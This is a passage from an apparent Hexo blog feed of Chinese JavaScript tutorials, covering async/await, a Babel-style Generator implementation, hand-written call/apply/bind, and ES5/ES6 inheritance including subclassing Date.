a)</code></li><li>这时候同步代码执行完毕，开始执行异步代码，将保存下来的值拿出来使用，这时候 <code>a = 10</code></li><li>然后后面就是常规执行代码了</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;async-和-await&quot;&gt;&lt;a href=&quot;#async-和-await&quot; class=&quot;headerlink&quot; title=&quot;async 和 await&quot;&gt;&lt;/a&gt;async 和 await&lt;/h2&gt;&lt;p&gt;async 和 await&lt;br&gt;1、一个函数如果加上 &lt;code&gt;async&lt;/code&gt; ，那么该函数就会返回一个 &lt;code&gt;Promise&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;test&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(test()); &lt;span class=&quot;comment&quot;&gt;// -&amp;gt; Promise &amp;#123;&amp;lt;resolved&amp;gt;: &quot;1&quot;&amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以把 &lt;code&gt;async&lt;/code&gt; 看成将函数返回值使用 &lt;code&gt;Promise.resolve()&lt;/code&gt; 包裹了下&lt;br&gt;
    
    </summary>
    
    
      <category term="异步" scheme="wangsiyuan233.github.io/tags/%E5%BC%82%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>深入理解JavaScript--异步系列(3)</title>
    <link href="wangsiyuan233.github.io/2018/08/23/69%E5%BC%82%E6%AD%A5%E7%B3%BB%E5%88%97-3/"/>
    <id>wangsiyuan233.github.io/2018/08/23/69异步系列-3/</id>
    <published>2018-08-23T03:03:01.000Z</published>
    <updated>2018-08-24T17:50:56.172Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Generator-实现"><a href="#Generator-实现" class="headerlink" title="Generator 实现"></a>Generator 实现</h2><p>Generator 是 ES6 中新增的语法，和 Promise 一样，都可以用来异步编程<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 使用 * 表示这是一个 Generator 函数</span></div><div class="line"><span class="comment">// 内部可以通过 yield 暂停代码</span></div><div class="line"><span class="comment">// 通过调用 next 恢复执行</span></div><div class="line"><span class="function"><span class="keyword">function</span>* <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">let</span> a = <span class="number">1</span> + <span class="number">2</span>;</div><div class="line">  <span class="keyword">yield</span> <span class="number">2</span>;</div><div class="line">  <span class="keyword">yield</span> <span class="number">3</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">let</span> b = test();</div><div class="line"><span class="built_in">console</span>.log(b.next()); <span class="comment">// &gt;  &#123; value: 2, done: false &#125;</span></div><div class="line"><span class="built_in">console</span>.log(b.next()); <span class="comment">// &gt;  &#123; value: 3, done: false &#125;</span></div><div class="line"><span class="built_in">console</span>.log(b.next()); <span class="comment">// &gt;  &#123; value: undefined, done: true &#125;</span></div></pre></td></tr></table></figure></p><a id="more"></a><p>从以上代码可以发现，加上 <code>*</code> 的函数执行后拥有了 <code>next</code> 函数，也就是说函数执行后返回了一个对象。每次调用 <code>next</code> 函数可以继续执行被暂停的代码。</p><p>以下是 <code>Generator</code> 函数的简单实现:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// cb 也就是编译过的 test 函数</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">generator</span>(<span class="params">cb</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> object = &#123;</div><div class="line">      <span class="attr">next</span>: <span class="number">0</span>,</div><div class="line">      <span class="attr">stop</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> &#123;</div><div class="line">      <span class="attr">next</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> ret = cb(object);</div><div class="line">        <span class="keyword">if</span> (ret === <span class="literal">undefined</span>) <span class="keyword">return</span> &#123; <span class="attr">value</span>: <span class="literal">undefined</span>, <span class="attr">done</span>: <span class="literal">true</span> &#125;;</div><div class="line">        <span class="keyword">return</span> &#123;</div><div class="line">          <span class="attr">value</span>: ret,</div><div class="line">          <span class="attr">done</span>: <span class="literal">false</span></div><div class="line">        &#125;;</div><div class="line">      &#125;</div><div class="line">    &#125;;</div><div class="line">  &#125;)();</div><div class="line">&#125;</div><div class="line"><span class="comment">// 如果你使用 babel 编译后可以发现 test 函数变成了这样</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> a;</div><div class="line">  <span class="keyword">return</span> generator(<span class="function"><span class="keyword">function</span>(<span class="params">_context</span>) </span>&#123;</div><div class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</div><div class="line">      <span class="keyword">switch</span> ((_context.prev = _context.next)) &#123;</div><div class="line">        <span class="comment">// 可以发现通过 yield 将代码分割成几块</span></div><div class="line">        <span class="comment">// 每次执行 next 函数就执行一块代码</span></div><div class="line">        <span class="comment">// 并且表明下次需要执行哪块代码</span></div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">          a = <span class="number">1</span> + <span class="number">2</span>;</div><div class="line">          _context.next = <span class="number">4</span>;</div><div class="line">          <span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">4</span>:</div><div class="line">          _context.next = <span class="number">6</span>;</div><div class="line">          <span class="keyword">return</span> <span class="number">3</span>;</div><div class="line"><span class="comment">// 执行完毕</span></div><div class="line">        <span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">"end"</span>:</div><div class="line">          <span class="keyword">return</span> _context.stop();</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;);</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Generator-实现&quot;&gt;&lt;a href=&quot;#Generator-实现&quot; class=&quot;headerlink&quot; title=&quot;Generator 实现&quot;&gt;&lt;/a&gt;Generator 实现&lt;/h2&gt;&lt;p&gt;Generator 是 ES6 中新增的语法，和 Promise 一样，都可以用来异步编程&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 使用 * 表示这是一个 Generator 函数&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 内部可以通过 yield 暂停代码&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 通过调用 next 恢复执行&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;test&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; a = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; b = test();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(b.next()); &lt;span class=&quot;comment&quot;&gt;// &amp;gt;  &amp;#123; value: 2, done: false &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(b.next()); &lt;span class=&quot;comment&quot;&gt;// &amp;gt;  &amp;#123; value: 3, done: false &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(b.next()); &lt;span class=&quot;comment&quot;&gt;// &amp;gt;  &amp;#123; value: undefined, done: true &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="异步" scheme="wangsiyuan233.github.io/tags/%E5%BC%82%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>聊聊系列(6)-- call, apply, bind 区别</title>
    <link href="wangsiyuan233.github.io/2018/08/23/68%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-6/"/>
    <id>wangsiyuan233.github.io/2018/08/23/68聊聊系列-6/</id>
    <published>2018-08-23T02:23:07.000Z</published>
    <updated>2018-08-23T17:58:31.454Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://wangsiyuan233.cn/2018/03/04/27%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">【【【this 实例-第9条】】】</a></p><blockquote><p>一、 call 和 apply 的异同</p></blockquote><p><code>call</code> 和 <code>apply</code> 都是为了解决改变 <code>this</code> 的指向。作用都是相同的，只是传参的方式不同。</p><p>除了第一个参数外，<code>call</code> 可以接收一个参数列表，<code>apply</code> 只接受一个参数数组。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> a = &#123;</div><div class="line">    <span class="attr">value</span>: <span class="number">1</span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params">name, age</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(name)</div><div class="line">    <span class="built_in">console</span>.log(age)</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.value)</div><div class="line">&#125;</div><div class="line">getValue.call(a, <span class="string">'yck'</span>, <span class="string">'24'</span>)</div><div class="line">getValue.apply(a, [<span class="string">'yck'</span>, <span class="string">'24'</span>])</div></pre></td></tr></table></figure></p><a id="more"></a><blockquote><p>二、自己动手实现</p></blockquote><p>可以从以下几点来考虑如何实现</p><ul><li>不传入第一个参数，那么默认为 <code>window</code></li><li>改变了 <code>this</code> 指向，让新的对象可以执行该函数。那么思路是否可以变成给新的对象添加一个函数，然后在执行完以后删除？</li></ul><p>1、call 的思路<br><figure class="highlight verilog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Function<span class="variable">.prototype</span><span class="variable">.myCall</span> = <span class="keyword">function</span> (<span class="keyword">context</span>) &#123;</div><div class="line">  <span class="keyword">var</span> <span class="keyword">context</span> = <span class="keyword">context</span> || window</div><div class="line">  <span class="comment">// 给 context 添加一个属性</span></div><div class="line">  <span class="comment">// getValue.call(a, 'yck', '24') =&gt; a.fn = getValue</span></div><div class="line">  <span class="keyword">context</span><span class="variable">.fn</span> = <span class="keyword">this</span></div><div class="line">  <span class="comment">// 将 context 后面的参数取出来</span></div><div class="line">  <span class="keyword">var</span> args = [..<span class="variable">.arguments</span>]<span class="variable">.slice</span>(<span class="number">1</span>)</div><div class="line">  <span class="comment">// getValue.call(a, 'yck', '24') =&gt; a.fn('yck', '24')</span></div><div class="line">  <span class="keyword">var</span> result = <span class="keyword">context</span><span class="variable">.fn</span>(..<span class="variable">.args</span>)</div><div class="line">  <span class="comment">// 删除 fn</span></div><div class="line">  delete <span class="keyword">context</span><span class="variable">.fn</span></div><div class="line">  <span class="keyword">return</span> result</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>2、apply 的思路<br><figure class="highlight verilog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Function<span class="variable">.prototype</span><span class="variable">.myApply</span> = <span class="keyword">function</span> (<span class="keyword">context</span>) &#123;</div><div class="line">  <span class="keyword">var</span> <span class="keyword">context</span> = <span class="keyword">context</span> || window</div><div class="line">  <span class="keyword">context</span><span class="variable">.fn</span> = <span class="keyword">this</span></div><div class="line"></div><div class="line">  <span class="keyword">var</span> result</div><div class="line">  <span class="comment">// 需要判断是否存储第二个参数</span></div><div class="line">  <span class="comment">// 如果存在，就将第二个参数展开</span></div><div class="line">  <span class="keyword">if</span> (arguments[<span class="number">1</span>]) &#123;</div><div class="line">    result = <span class="keyword">context</span><span class="variable">.fn</span>(..<span class="variable">.arguments</span>[<span class="number">1</span>])</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    result = <span class="keyword">context</span><span class="variable">.fn</span>()</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  delete <span class="keyword">context</span><span class="variable">.fn</span></div><div class="line">  <span class="keyword">return</span> result</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>3、bind 的思路</p><p>bind 和其他两个方法作用也是一致的，只是该方法会返回一个函数。并且我们可以通过 bind 实现柯里化。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">'function'</span>) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Error'</span>)</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">var</span> _this = <span class="keyword">this</span></div><div class="line">  <span class="keyword">var</span> args = [...arguments].slice(<span class="number">1</span>)</div><div class="line">  <span class="comment">// 返回一个函数</span></div><div class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 因为返回了一个函数，我们可以 new F()，所以需要判断</span></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> <span class="keyword">instanceof</span> F) &#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">new</span> _this(...args, ...arguments)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> _this.apply(context, args.concat(...arguments))</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://wangsiyuan233.cn/2018/03/04/27%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-2/&quot;&gt;【【【this 实例-第9条】】】&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一、 call 和 apply 的异同&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;call&lt;/code&gt; 和 &lt;code&gt;apply&lt;/code&gt; 都是为了解决改变 &lt;code&gt;this&lt;/code&gt; 的指向。作用都是相同的，只是传参的方式不同。&lt;/p&gt;
&lt;p&gt;除了第一个参数外，&lt;code&gt;call&lt;/code&gt; 可以接收一个参数列表，&lt;code&gt;apply&lt;/code&gt; 只接受一个参数数组。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; a = &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getValue&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;name, age&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(name)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(age)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.value)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;getValue.call(a, &lt;span class=&quot;string&quot;&gt;&#39;yck&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;24&#39;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;getValue.apply(a, [&lt;span class=&quot;string&quot;&gt;&#39;yck&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;24&#39;&lt;/span&gt;])&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="聊聊系列" scheme="wangsiyuan233.github.io/tags/%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>聊聊系列(5)-- 继承</title>
    <link href="wangsiyuan233.github.io/2018/08/22/67%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-5/"/>
    <id>wangsiyuan233.github.io/2018/08/22/67聊聊系列-5/</id>
    <published>2018-08-22T13:11:28.000Z</published>
    <updated>2018-08-23T17:16:08.313Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一、ES5</p></blockquote><p>在 ES5 中，我们可以使用如下方式解决继承的问题,实现思路就是将子类的原型设置为父类的原型<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Super</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">Super.prototype.getNumber = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> Sub()</div><div class="line">Sub.prototype = <span class="built_in">Object</span>.create(Super.prototype, &#123;</div><div class="line">  <span class="attr">constructor</span>: &#123;</div><div class="line">    <span class="attr">value</span>: Sub,</div><div class="line">    <span class="attr">enumerable</span>: <span class="literal">false</span>,</div><div class="line">    <span class="attr">writable</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">configurable</span>: <span class="literal">true</span></div><div class="line">  &#125;</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p><a id="more"></a><blockquote><p>二、ES6</p></blockquote><p>通过 class 语法轻松解决ES5的问题<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDate</span> <span class="keyword">extends</span> <span class="title">Date</span> </span>&#123;</div><div class="line">  test() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getTime()</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">let myDate = <span class="keyword">new</span> <span class="type">MyDate</span>()</div><div class="line">myDate.test()</div></pre></td></tr></table></figure></p><p>但是 ES6 不是所有浏览器都兼容，所以我们需要使用 Babel 来编译这段代码。</p><p>如果你使用编译过得代码调用 <code>myDate.test()</code> 你会惊奇地发现出现了报错<br><img src="https://i.imgur.com/5EPAs20.png" alt=""><br>因为在 JS 底层有限制，如果不是由 Date 构造出来的实例的话，是不能调用 Date 里的函数的。所以这也侧面的说明了：ES6 中的 <code>class</code> 继承与 ES5 中的一般继承写法是不同的。</p><p>既然底层限制了实例必须由 Date 构造出来，那么我们可以改变下思路实现继承<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">MyData</span>(<span class="params"></span>) </span>&#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line">MyData.prototype.test = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.getTime()</div><div class="line">&#125;</div><div class="line"><span class="keyword">let</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>()</div><div class="line"><span class="built_in">Object</span>.setPrototypeOf(d, MyData.prototype)</div><div class="line"><span class="built_in">Object</span>.setPrototypeOf(MyData.prototype, <span class="built_in">Date</span>.prototype)</div></pre></td></tr></table></figure></p><p>以上继承实现思路：先创建父类实例 =&gt; 改变实例原先的 <code>_proto__</code> 转而连接到子类的 <code>prototype</code> =&gt; 子类的 <code>prototype</code> 的 <code>__proto__</code> 改为父类的 <code>prototype</code>。</p><p>通过以上方法实现的继承就可以完美解决 JS 底层的这个限制。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一、ES5&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在 ES5 中，我们可以使用如下方式解决继承的问题,实现思路就是将子类的原型设置为父类的原型&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Super&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Super.prototype.getNumber = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span 